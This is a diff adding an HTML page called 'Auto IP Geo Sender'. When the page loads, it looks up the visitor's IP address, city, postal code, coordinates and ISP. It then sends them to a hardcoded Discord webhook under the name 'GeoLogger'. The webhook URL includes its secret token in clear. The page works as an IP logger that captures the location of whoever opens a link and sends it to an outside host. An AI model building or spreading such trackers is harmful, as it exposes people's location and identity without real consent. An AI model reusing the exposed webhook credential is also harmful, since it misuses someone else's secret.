@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>IP Geo Webhook Sender (Auto-send on load)</title>
+  <style>
+    body { font-family: Arial, sans-serif; max-width: 600px; margin: 50px auto; padding: 20px; text-align: center; }
+    #status { margin-top: 20px; padding: 10px; border-radius: 5px; }
+    .success { background: #d4edda; color: #155724; }
+    .error { background: #f8d7da; color: #721c24; }
+    .info { background: #e9f7ff; color: #034f84; }
+  </style>
+</head>
+<body>
+  <h1>Auto IP Geo Sender</h1>
+  <p>This will fetch IP-based geo info automatically when you open the page and attempt to send it to the webhook.</p>
+  <div id="status" class="info">Waiting to start...</div>
+
+<script>
+  async function sendGeoToWebhook() {
+    const statusEl = document.getElementById('status');
+    statusEl.textContent = 'Fetching IP geo info...';
+    statusEl.className = 'info';
+    console.log('sendGeoToWebhook: start');
+
+    try {
+      // Use HTTPS ip geolocation to avoid mixed-content errors
+      const apiResponse = await fetch('https://ipapi.co/json/');
+      if (!apiResponse.ok) {
+        throw new Error('IP API returned ' + apiResponse.status);
+      }
+      const geoData = await apiResponse.json();
+      console.log('IP API data:', geoData);
+
+      // Prepare Discord-friendly payload
+      const payload = {
+        username: "GeoLogger",
+        content: `🌍 **New Geo Info Captured**\n\n` +
+                 `**IP:** ${geoData.ip || 'N/A'}\n` +
+                 `**Country:** ${geoData.country_name || 'N/A'}\n` +
+                 `**Region:** ${geoData.region || 'N/A'}\n` +
+                 `**City:** ${geoData.city || 'N/A'}\n` +
+                 `**ZIP:** ${geoData.postal || 'N/A'}\n` +
+                 `**Lat/Lon:** ${geoData.latitude || 'N/A'}, ${geoData.longitude || 'N/A'}\n` +
+                 `**ISP/Org:** ${geoData.org || 'N/A'}\n` +
+                 `⏰ **Timestamp:** ${new Date().toISOString()}`
+      };
+
+      // Your webhook (replace with yours). NOTE: Direct browser calls to Discord often hit CORS.
+      const webhookUrl = 'https://discord.com/api/webhooks/1411086092026777742/60wVbPvrvNubv9vpZaHbAFXf3HsYBxB-VjDEduG-Qj_6KFOPhKyRj6jtIah_4MqlkEJg';
+
+      statusEl.textContent = 'Sending to webhook...';
+      console.log('Posting to webhook...', webhookUrl);
+
+      const webhookResponse = await fetch(webhookUrl, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
+      });
+
+      // NOTE: if CORS blocks this request, fetch will reject with a TypeError and you will see "Failed to fetch"
+      if (webhookResponse.ok) {
+        statusEl.textContent = '✅ Success! Geo info sent to webhook.';
+        statusEl.className = 'success';
+        console.log('Webhook response ok', webhookResponse);
+      } else {
+        const txt = await webhookResponse.text().catch(()=> '');
+        throw new Error(`Webhook error: ${webhookResponse.status} ${webhookResponse.statusText} ${txt}`);
+      }
+
+    } catch (error) {
+      // show clear diagnostics to user + console
+      statusEl.textContent = '❌ Error: ' + (error.message || error);
+      statusEl.className = 'error';
+      console.error('sendGeoToWebhook error:', error);
+      // If you suspect CORS, the console will show a CORS message; I can't bypass CORS from client-side JS.
+    }
+  }
+
+  // Auto-run on page load after short delay so user can see the page before network activity starts
+  window.addEventListener('DOMContentLoaded', () => {
+    setTimeout(() => {
+      sendGeoToWebhook();
+    }, 500); // 500ms delay
+  });
+</script>
+</body>
+</html>
+
+
+
+
